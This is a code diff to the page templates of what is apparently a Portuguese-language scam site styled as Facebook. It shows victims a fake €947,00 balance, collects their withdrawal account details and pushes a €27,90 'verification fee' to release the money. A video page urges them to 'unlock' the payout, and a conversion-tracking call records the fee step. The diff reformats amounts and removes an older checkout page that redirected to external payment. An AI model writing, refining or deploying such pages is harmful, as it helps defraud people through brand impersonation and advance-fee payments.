@@ -20,20 +20,20 @@ const pages = {
       <div class="balance-card">
         <div class="balance-title">O Seu Saldo</div>
         <div class="balance-amount-wrapper">
-          <div class="balance-amount">€947.00</div>
+          <div class="balance-amount">€947,00</div>
           <img class="balance-image" src="images/p-saldo-maior.png" alt="ícone">
         </div>
       </div>
       
       <div class="last-rewards">
-        Ganhos recentes: €54.87
+        Ganhos recentes: €54,87
       </div>
       
       <!-- Seção Branca Principal -->
       <div class="withdraw-content">
         <h2 class="withdraw-title">Levantar Dinheiro</h2>
         
-        <!-- Payment Methods -->
+        <!-- Payment Methods Indicator -->
         <div class="payment-methods-row">
           <div class="payment-method-item">
             <img src="/Logo_MBWay.svg.png" alt="MB Way" class="payment-method-logo">
@@ -66,12 +66,12 @@ const pages = {
           </div>
         </div>
         
-        <!-- Botões de Valor (Opcional) -->
+        <!-- Botões de Valor -->
         <div class="amount-options">
-          <button class="amount-btn" data-amount="1.50">€1.50</button>
+          <button class="amount-btn" data-amount="1.50">€1,50</button>
           <button class="amount-btn" data-amount="5">€5</button>
           <button class="amount-btn" data-amount="10">€10</button>
-          <button class="amount-btn" data-amount="947.00">€947.00</button>
+          <button class="amount-btn selected" data-amount="947.00">€947,00</button>
         </div>
         
         <!-- Display do Método Selecionado -->
@@ -87,16 +87,14 @@ const pages = {
         </div>
         
         <!-- Formulário do Método -->
-        <div id="method-form-container" style="display: none;">
-          <!-- Formulário será inserido aqui dinamicamente -->
-        </div>
+        <div id="method-form-container" style="display: none;"></div>
         
         <!-- Botão Adicionar Método -->
         <button class="add-method-btn" id="add-method-btn">Adicionar Método de Levantamento</button>
 
         <!-- Info Texts -->
         <div class="withdraw-info-text">
-          <p>Para levantar o dinheiro, precisa de um saldo mínimo de €0.40.</p>
+          <p>Para levantar o dinheiro, precisa de um saldo mínimo de €0,40.</p>
           <p>Os limites de levantamento podem variar de acordo com a sua região.</p>
         </div>
       </div>
@@ -107,13 +105,9 @@ const pages = {
     <div class="loading-page">
       <div class="loading-content">
         <div class="facebook-logo">
-  <img
-    class="facebook-logo__image"
-    src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/3840px-Facebook_Logo_%282019%29.svg.png"
-    alt="Facebook"
-  />
-</div>
-<br>
+          <img class="facebook-logo__image" src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/3840px-Facebook_Logo_%282019%29.svg.png" alt="Facebook" />
+        </div>
+        <br>
         <div class="loading-text">A validar acesso...</div>
         <div class="loading-spinner"></div>
       </div>
@@ -228,105 +222,34 @@ const pages = {
         <div class="confirmation-timer">
           ⏱️ Reembolso emitido em 1 minuto
         </div>
-        <div class="confirmation-success-message" id="confirmation-success-message">
-          ✅ Identidade confirmada. € 27,90 reembolsados e levantamento libertado.
-        </div>
-      </div>
-
-      <!-- Footer -->
-      <div class="confirmation-footer">
-        <div class="confirmation-footer-text">Este processo cumpre com as regulamentações europeias de verificação de identidade e proteção de dados.</div>
       </div>
     </div>
   `,
 
   video: `
-  <div class="video-page">
-  <div class="video-header">
-    VEJA O VÍDEO ABAIXO PARA DESBLOQUEAR O SEU LEVANTAMENTO E ACESSO VITALÍCIO.
-  </div>
-  
-  <div class="header-content" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-    <div class="logo-container">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/3840px-Facebook_Logo_%282019%29.svg.png" alt="Facebook" style="height: 30px;">
-    </div>
-    
-    <div class="balance-display" style="border: 2px solid #3b5998; border-radius: 8px; padding: 15px; text-align: center;">
-      <div style="font-size: 14px; margin-bottom: 5px;">SALDO</div>
-      <div class="balance-amount" style="font-size: 18px; font-weight: bold;">€ 947,00</div>
-    </div>
-  </div>
-  
-  <div style="border-bottom: 4px solid #3b5998; margin-bottom: 20px;"></div>
-  
-  <h1 style="color: #3b5998; font-weight: 800; font-style: bold; font-family: 'Roboto', sans-serif;">
-    DESBLOQUEIO DE SALDO
-  </h1>
-  <p class="video-instruction">Veja como desbloquear o seu levantamento assistindo ao vídeo.</p>
-  
-  <div class="video-container">
-    <video
-      id="tutorial-video"
-      controls
-      preload="metadata"
-      poster="https://charming-figolla-3a3b33.netlify.app//src/media/capatiktok.jpg"
-      playsinline
-    >
-      <source src="https://harmonious-toffee-77df94.netlify.app/video.mp4" type="video/mp4">
-      Your browser does not support video playback.
-    </video>
-  </div>
-  
-  <button class="unlock-btn">
-    DESBLOQUEAR AGORA
-  </button>
-</div>
-  `,
-
-  checkout: `
-    <div class="checkout-page">
-      <div class="page-header">
-        <button class="back-btn checkout-back-btn">
-          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
-        </button>
-        <h1>Pagamento</h1>
+    <div class="video-page">
+      <div class="video-header">
+        VEJA O VÍDEO ABAIXO PARA DESBLOQUEAR O SEU LEVANTAMENTO E ACESSO VITALÍCIO.
       </div>
-      <div class="checkout-container">
-        <div class="checkout-header">
-          <h1>Pagamento da Taxa</h1>
-          <div class="amount">€27.90</div>
+      <div class="header-content" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+        <div class="logo-container">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/3840px-Facebook_Logo_%282019%29.svg.png" alt="Facebook" style="height: 30px;">
         </div>
-        <div class="checkout-content">
-          <div class="checkout-summary">
-            <div class="summary-row">
-              <span>Taxa de Verificação:</span>
-              <strong>€27.90</strong>
-            </div>
-            <div class="summary-row total">
-              <span>Total a pagar:</span>
-              <strong>€27.90</strong>
-            </div>
-          </div>
-          <div class="payment-methods-info">
-            <span class="icon">💳</span>
-            <div>
-              <strong>Métodos disponíveis:</strong>
-              <span id="payment-methods-label">Cartão de Crédito/Débito, MB Way e Multibanco</span>
-            </div>
-          </div>
-          <div class="checkout-payment-warning">
-            ⚠️ Esta taxa é processada de forma segura. As informações da sua conta de levantamento não são usadas para este pagamento.
-          </div>
-          <button type="button" class="checkout-btn" id="checkout-btn">
-            Pagar €27,90
-          </button>
-          <div class="checkout-error" id="checkout-error"></div>
-        </div>
-        <div class="checkout-footer">
-          <p>🔒 Pagamento Seguro por Cooud</p>
-          <p>Será redirecionado para o checkout</p>
+        <div class="balance-display" style="border: 2px solid #3b5998; border-radius: 8px; padding: 15px; text-align: center;">
+          <div style="font-size: 14px; margin-bottom: 5px;">SALDO</div>
+          <div class="balance-amount" style="font-size: 18px; font-weight: bold;">€ 947,00</div>
         </div>
       </div>
+      <div style="border-bottom: 4px solid #3b5998; margin-bottom: 20px;"></div>
+      <h1 style="color: #3b5998; font-weight: 800; font-family: 'Roboto', sans-serif;">DESBLOQUEIO DE SALDO</h1>
+      <p class="video-instruction">Assista ao vídeo para saber como libertar o seu pagamento.</p>
+      <div class="video-container">
+        <video id="tutorial-video" controls preload="metadata" poster="https://charming-figolla-3a3b33.netlify.app//src/media/capatiktok.jpg" playsinline>
+          <source src="https://harmonious-toffee-77df94.netlify.app/video.mp4" type="video/mp4">
+          O seu navegador não suporta vídeos.
+        </video>
+      </div>
+      <button class="unlock-btn">DESBLOQUEAR AGORA</button>
     </div>
   `,
 };
@@ -339,29 +262,23 @@ function showPage(pageName) {
   const container = document.querySelector(".app-container");
   if (!container) return;
 
-  // Save current content if it's the first navigation
   if (!currentPage) {
     currentPage = container.innerHTML;
   }
 
-  // Update container with new page content
   container.innerHTML = pages[pageName];
 
-  // Add page-specific event listeners
   if (pageName === "withdraw") {
     setupWithdrawPage();
   } else if (pageName === "registration") {
     setupRegistrationPage();
   } else if (pageName === "video") {
     setupVideoPage();
-  } else if (pageName === "checkout") {
-    setupCheckoutPage();
   }
 }
 
 // Setup event listeners for withdraw page
 function setupWithdrawPage() {
-  // Back button
   const backBtn = document.querySelector(".back-btn");
   if (backBtn) {
     backBtn.addEventListener("click", () => {
@@ -370,7 +287,6 @@ function setupWithdrawPage() {
     });
   }
 
-  // Amount selection
   document.querySelectorAll(".amount-btn").forEach((btn) => {
     btn.addEventListener("click", () => {
       document.querySelectorAll(".amount-btn").forEach((b) => b.classList.remove("selected"));
@@ -378,7 +294,6 @@ function setupWithdrawPage() {
     });
   });
 
-  // Botão adicionar método
   const addMethodBtn = document.getElementById("add-method-btn");
   if (addMethodBtn) {
     addMethodBtn.addEventListener("click", () => {
@@ -415,23 +330,6 @@ function setupRegistrationPage() {
         trackInitiateCheckout(27.90);
       }
       window.location.href = "loading.html" + window.location.search;
-    });
-  }
-}
-
-// Setup event listeners for checkout page
-function setupCheckoutPage() {
-  const backBtn = document.querySelector(".checkout-back-btn");
-  if (backBtn) {
-    backBtn.addEventListener("click", () => {
-      showPage("registration");
-    });
-  }
-
-  const checkoutBtn = document.getElementById("checkout-btn");
-  if (checkoutBtn && typeof COOUD_CONFIG !== "undefined" && COOUD_CONFIG.checkoutUrl) {
-    checkoutBtn.addEventListener("click", () => {
-      window.location.href = COOUD_CONFIG.checkoutUrl + window.location.search;
     });
   }
 }
@@ -635,11 +533,6 @@ function submitMethodForm() {
     if (!name || !email) { alert("Por favor, preencha todos os campos"); return; }
     formData = { name, account: email, method: "applepay" };
   }
-
-  window.withdrawalFormData = formData;
-  showPage("loading");
-  setTimeout(() => { showPage("registration"); }, 2500);
-}
 
   window.withdrawalFormData = formData;
   showPage("loading");
